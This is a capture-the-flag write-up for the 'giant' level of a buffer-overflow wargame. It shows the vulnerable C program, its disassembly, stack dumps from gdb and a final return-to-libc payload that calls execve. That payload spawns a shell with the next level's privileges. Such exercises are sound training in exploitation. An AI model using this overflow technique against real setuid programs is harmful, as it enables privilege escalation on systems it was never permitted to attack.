# Level 13, Bugbear -> Giant

### giant.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - giant
        - RTL2
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

main(int argc, char *argv[])
{
        char buffer[40];
        FILE *fp;
        char *lib_addr, *execve_offset, *execve_addr;
        char *ret;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // gain address of execve
        fp = popen("/usr/bin/ldd /home/giant/assassin | /bin/grep libc | /bin/awk '{print $4}'", "r");
        fgets(buffer, 255, fp);
        sscanf(buffer, "(%x)", &lib_addr);
        fclose(fp);

        fp = popen("/usr/bin/nm /lib/libc.so.6 | /bin/grep __execve | /bin/awk '{print $1}'", "r");
        fgets(buffer, 255, fp);
        sscanf(buffer, "%x", &execve_offset);
        fclose(fp);

        execve_addr = lib_addr + (int)execve_offset;
        // end

        memcpy(&ret, &(argv[1][44]), 4);
        if(ret != execve_addr)
        {
                printf("You must use execve!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}

```

### Analysis

#### Disassembling the "giant"

```sh
Dump of assembler code for function main:
0x8048560 <main>:       push   %ebp
0x8048561 <main+1>:     mov    %ebp,%esp
0x8048563 <main+3>:     sub    %esp,60
0x8048566 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804856a <main+10>:    jg     0x8048583 <main+35>
0x804856c <main+12>:    push   0x8048700
0x8048571 <main+17>:    call   0x8048444 <printf>
0x8048576 <main+22>:    add    %esp,4
0x8048579 <main+25>:    push   0
0x804857b <main+27>:    call   0x8048474 <exit>
0x8048580 <main+32>:    add    %esp,4
0x8048583 <main+35>:    push   0x804870c
0x8048588 <main+40>:    push   0x8048720
0x804858d <main+45>:    call   0x8048404 <popen>
0x8048592 <main+50>:    add    %esp,8
0x8048595 <main+53>:    mov    %eax,%eax
0x8048597 <main+55>:    mov    DWORD PTR [%ebp-44],%eax
0x804859a <main+58>:    mov    %eax,DWORD PTR [%ebp-44]
0x804859d <main+61>:    push   %eax
0x804859e <main+62>:    push   0xff
0x80485a3 <main+67>:    lea    %eax,[%ebp-40]
0x80485a6 <main+70>:    push   %eax
0x80485a7 <main+71>:    call   0x8048424 <fgets>
0x80485ac <main+76>:    add    %esp,12
0x80485af <main+79>:    lea    %eax,[%ebp-48]
0x80485b2 <main+82>:    push   %eax
0x80485b3 <main+83>:    push   0x804876b
0x80485b8 <main+88>:    lea    %eax,[%ebp-40]
0x80485bb <main+91>:    push   %eax
0x80485bc <main+92>:    call   0x8048484 <sscanf>
0x80485c1 <main+97>:    add    %esp,12
0x80485c4 <main+100>:   mov    %eax,DWORD PTR [%ebp-44]
0x80485c7 <main+103>:   push   %eax
0x80485c8 <main+104>:   call   0x8048464 <fclose>
0x80485cd <main+109>:   add    %esp,4
0x80485d0 <main+112>:   push   0x804870c
0x80485d5 <main+117>:   push   0x8048780
0x80485da <main+122>:   call   0x8048404 <popen>
0x80485df <main+127>:   add    %esp,8
0x80485e2 <main+130>:   mov    %eax,%eax
0x80485e4 <main+132>:   mov    DWORD PTR [%ebp-44],%eax
0x80485e7 <main+135>:   mov    %eax,DWORD PTR [%ebp-44]
0x80485ea <main+138>:   push   %eax
0x80485eb <main+139>:   push   0xff
0x80485f0 <main+144>:   lea    %eax,[%ebp-40]
0x80485f3 <main+147>:   push   %eax
0x80485f4 <main+148>:   call   0x8048424 <fgets>
0x80485f9 <main+153>:   add    %esp,12
0x80485fc <main+156>:   lea    %eax,[%ebp-52]
0x80485ff <main+159>:   push   %eax
0x8048600 <main+160>:   push   0x80487c8
0x8048605 <main+165>:   lea    %eax,[%ebp-40]
0x8048608 <main+168>:   push   %eax
0x8048609 <main+169>:   call   0x8048484 <sscanf>
0x804860e <main+174>:   add    %esp,12
0x8048611 <main+177>:   mov    %eax,DWORD PTR [%ebp-44]
0x8048614 <main+180>:   push   %eax
0x8048615 <main+181>:   call   0x8048464 <fclose>
0x804861a <main+186>:   add    %esp,4
0x804861d <main+189>:   mov    %eax,DWORD PTR [%ebp-48]
0x8048620 <main+192>:   mov    %edx,DWORD PTR [%ebp-52]
0x8048623 <main+195>:   lea    %ecx,[%edx+%eax*1]
0x8048626 <main+198>:   mov    DWORD PTR [%ebp-56],%ecx
0x8048629 <main+201>:   push   4
0x804862b <main+203>:   mov    %eax,DWORD PTR [%ebp+12]
0x804862e <main+206>:   add    %eax,4
0x8048631 <main+209>:   mov    %edx,DWORD PTR [%eax]
0x8048633 <main+211>:   add    %edx,44
0x8048636 <main+214>:   push   %edx
0x8048637 <main+215>:   lea    %eax,[%ebp-60]
0x804863a <main+218>:   push   %eax
0x804863b <main+219>:   call   0x8048454 <memcpy>
0x8048640 <main+224>:   add    %esp,12
0x8048643 <main+227>:   mov    %eax,DWORD PTR [%ebp-60]
0x8048646 <main+230>:   cmp    %eax,DWORD PTR [%ebp-56]
0x8048649 <main+233>:   je     0x8048662 <main+258>
0x804864b <main+235>:   push   0x80487cb
0x8048650 <main+240>:   call   0x8048444 <printf>
0x8048655 <main+245>:   add    %esp,4
0x8048658 <main+248>:   push   0
0x804865a <main+250>:   call   0x8048474 <exit>
0x804865f <main+255>:   add    %esp,4
0x8048662 <main+258>:   mov    %eax,DWORD PTR [%ebp+12]
0x8048665 <main+261>:   add    %eax,4
0x8048668 <main+264>:   mov    %edx,DWORD PTR [%eax]
0x804866a <main+266>:   push   %edx
0x804866b <main+267>:   lea    %eax,[%ebp-40]
0x804866e <main+270>:   push   %eax
0x804866f <main+271>:   call   0x8048494 <strcpy>
0x8048674 <main+276>:   add    %esp,8
0x8048677 <main+279>:   lea    %eax,[%ebp-40]
0x804867a <main+282>:   push   %eax
0x804867b <main+283>:   push   0x80487e1
0x8048680 <main+288>:   call   0x8048444 <printf>
0x8048685 <main+293>:   add    %esp,8
0x8048688 <main+296>:   leave
0x8048689 <main+297>:   ret
```

#### Estimated Stack Structure

```sh
|  char *ret            | [%ebp-60]
|  char *execve_addr    | [%ebp-56]
|  char *lib_addr       | [%ebp-52]
|  char *execve_offset  | [%ebp-48]
|  FILE *fp             | [%ebp-44]
|  char buffer[40]      | [%ebp-40]
|  SFP                  | [%ebp]
|  RET                  | [%ebp+4]
|  ARGC                 | [%ebp+8]
|  Pointer to ARGV[0]   | [%ebp+C]
```


#### Observed Stack Structure (bp at *main+227)

```sh
(gdb) run `python -c "print 'A'*40"`
Starting program: /home/bugbear/giant-cp `python -c "print 'A'*40"`
ldd: /home/giant/assassin: No such file or directory

Breakpoint 1, 0x8048643 in main ()
(gdb) x/100x $esp
0xbffffaac:     0x6f682f3d      0x080da023      0x00091d48      0x080482db  -> ret, execve_addr, lib_addr, execve_offset
0xbffffabc:     0x08049908      0x39303030      0x38346431      0x400f000a  -> fp, buffer[40]
0xbffffacc:     0x08049808      0x4000ae60      0xbffffb34      0xbffffae8  -> buffer[40]
0xbffffadc:     0x0804854b      0x080497f4      0x08049808      0xbffffb08  -> buffer[40], SFP
0xbffffaec:     0x400309cb      0x00000002      0xbffffb34      0xbffffb40  -> RET, ARGC, ARGV[0]
0xbffffafc:     0x40013868      0x00000002      0x080484b0      0x00000000
0xbffffb0c:     0x080484d1      0x08048560      0x00000002      0xbffffb34
0xbffffb1c:     0x080483b4      0x080486bc      0x4000ae60      0xbffffb2c
0xbffffb2c:     0x40013e90      0x00000002      0xbffffc2d      0xbffffc44
0xbffffb3c:     0x00000000      0xbffffc6d      0xbffffc7f      0xbffffc98
0xbffffb4c:     0xbffffcb7      0xbffffcd9      0xbffffce6      0xbffffea9
0xbffffb5c:     0xbffffec8      0xbffffee5      0xbffffefa      0xbfffff19
0xbffffb6c:     0xbfffff24      0xbfffff34      0xbfffff3c      0xbfffff4d
0xbffffb7c:     0xbfffff57      0xbfffff65      0xbfffff76      0xbfffff84
0xbffffb8c:     0xbfffff8f      0xbfffffa2      0x00000000      0x00000003
0xbffffb9c:     0x08048034      0x00000004      0x00000020      0x00000005
0xbffffbac:     0x00000006      0x00000006      0x00001000      0x00000007
0xbffffbbc:     0x40000000      0x00000008      0x00000000      0x00000009
0xbffffbcc:     0x080484b0      0x0000000b      0x00000201      0x0000000c
0xbffffbdc:     0x00000201      0x0000000d      0x00000201      0x0000000e
0xbffffbec:     0x00000201      0x00000010      0x0fabfbff      0x0000000f
0xbffffbfc:     0xbffffc28      0x00000000      0x00000000      0x00000000
0xbffffc0c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc1c:     0x00000000      0x00000000      0x00000000      0x36383669
0xbffffc2c:     0x6f682f00      0x622f656d      0x65626775      0x672f7261
```

### Exploit

#### How to pwn

1. `execve()` 주소를 찾는다.
```sh
(gdb) p execve
$1 = {<text variable, no debug info>} 0x400a9d48 <__execve>
```

2. Exploit에 사용할 환경변수를 생성하고, 쓸만한 툴들을 찾는다.
```sh
[bugbear@localhost bugbear]$ export bugbear="/bin/sh"
```

```sh
Breakpoint 1, 0x8048643 in main ()
(gdb) x/1000s 0xbffffc30
...
0xbffffc5d:      "PWD=/home/bugbear"
0xbffffc6f:      "bugbear=/bin/sh"
0xbffffc7f:      "REMOTEHOST=192.168.206.1"
0xbffffc98:      "HOSTNAME=localhost.localdomain"
0xbffffcb7:      "LESSOPEN=|/usr/bin/lesspipe.sh %s"
0xbffffcd9:      "USER=bugbear"
...
(gdb) x/s 0xbffffc77
0xbffffc77:      "/bin/sh"
(gdb) x/s 0xbfffffe5
0xbfffffe5:      "/home/bugbear/giant-cp"
(gdb) x/x 0xbffffffc
0xbffffffc:     0x00000000
```


#### Final Payload

```
 ./giant "`python -c 'print "\x90" * 44 + "\x48\x9d\x0a\x40" + "\xe0\x8a\x05\x40" + "\xe0\x91\x03\x40" + "\xf9\xbf\x0f\x40"'`"
```

### Result

```
[bugbear@localhost bugbear]$ ./giant "`python -c 'print "\x90" * 44 + "\x48\x9d\x0a\x40" + "\xe0\x8a\x05\x40" + "\xe0\x91\x03\x40" + "\xf9\xbf\x0f\x40"'`"
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒H▒
@▒@▒@▒@
bash$ id
uid=513(bugbear) gid=513(bugbear) euid=514(giant) egid=514(giant) groups=513(bugbear)
bash$ my-pass
euid = 514
one step closer
```